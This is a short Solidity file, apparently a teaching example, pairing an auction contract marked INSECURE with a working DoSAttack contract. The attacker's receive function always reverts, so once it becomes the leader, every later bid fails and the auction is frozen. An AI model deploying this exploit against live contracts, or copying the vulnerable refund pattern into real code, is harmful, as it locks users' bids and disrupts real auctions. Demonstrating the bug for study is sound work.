// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// INSECURE
contract DoSVulnerable {
   address payable currentLeader;
   uint256 public highestBid;

   function bid() external payable {
    require(msg.value > highestBid, "Insufficient amount");
    require(currentLeader.send(highestBid)); // 

    currentLeader = payable(msg.sender);
    highestBid = msg.value;
   } 
}


contract DoSAttack {
    DoSVulnerable public vulnerableContract;

    // Set the address of the vulnerable contract
    constructor(address _vulnerableContract) {
        vulnerableContract = DoSVulnerable(_vulnerableContract);
    }

    // Receive function that reverts whenever it receives funds
    receive() external payable {
        revert("DoS Attack: Bid cannot be refunded");
    }

    // The attacker calls this function to become the highest bidder
    function attack() external payable {
        require(msg.value > vulnerableContract.highestBid(), "Insufficient bid");

        // Place a bid with higher value to become the current leader
        vulnerableContract.bid{value: msg.value}();
    }
}